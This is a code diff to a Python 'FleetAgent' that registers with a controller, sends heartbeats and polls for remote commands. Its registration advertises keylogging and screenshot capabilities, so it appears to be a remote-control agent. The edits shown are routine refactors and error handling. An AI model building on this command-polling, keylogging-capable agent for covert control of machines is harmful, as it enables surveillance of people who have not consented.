@@ -25,6 +25,12 @@ from agent_controller import (
 
 logger = logging.getLogger(__name__)
 
+# Pre-import system metrics at module level (avoid repeated dynamic import in heartbeat loop)
+try:
+    from utils.system_info import get_system_metrics as _get_sys_metrics
+except ImportError:
+    _get_sys_metrics = None
+
 
 class FleetAgent(Agent):
     """
@@ -117,7 +123,7 @@ class FleetAgent(Agent):
                 "hostname": self.hostname,
                 "platform": self.platform,
                 "version": self.version,
-                "public_key": self.public_key.decode("utf-8"),
+                "public_key": self.public_key.decode("utf-8") if self.public_key else "",
                 "capabilities": {
                     "keylogging": self.capabilities.keylogging,
                     "screenshots": self.capabilities.screenshots,
@@ -137,8 +143,8 @@ class FleetAgent(Agent):
 
             if resp and resp.status_code == 200:
                 data = resp.json()
-                self.access_token = data["access_token"]
-                self.refresh_token = data["refresh_token"]
+                self.access_token = data.get("access_token")
+                self.refresh_token = data.get("refresh_token")
 
                 # Gap 4: Secure Channel Handshake
                 controller_key = data.get("controller_public_key")
@@ -173,13 +179,7 @@ class FleetAgent(Agent):
 
                 self.uptime = time.time() - self.start_time
 
-                # Get real system metrics
-                try:
-                    from utils.system_info import get_system_metrics
-
-                    metrics = get_system_metrics()
-                except ImportError:
-                    metrics = {"cpu_percent": 0, "memory_percent": 0}
+                metrics = self._get_system_metrics()
 
                 payload = {
                     "status": "ONLINE",
@@ -221,7 +221,11 @@ class FleetAgent(Agent):
                 resp = await self._request("GET", "/commands")
 
                 if resp and resp.status_code == 200:
-                    data = resp.json()
+                    try:
+                        data = resp.json()
+                    except (ValueError, Exception):
+                        logger.warning("Invalid JSON in command poll response")
+                        data = {}
                     commands = data.get("commands", [])
 
                     for cmd_data in commands:
@@ -268,3 +272,13 @@ class FleetAgent(Agent):
         resp_payload = {"result": result, "success": success, "error": error}
 
         await self._request("POST", f"/commands/{cmd_id}/response", json=resp_payload)
+
+    @staticmethod
+    def _get_system_metrics() -> dict:
+        """Get system metrics using pre-imported function."""
+        if _get_sys_metrics is not None:
+            try:
+                return _get_sys_metrics()
+            except Exception:
+                pass
+        return {"cpu_percent": 0, "memory_percent": 0}
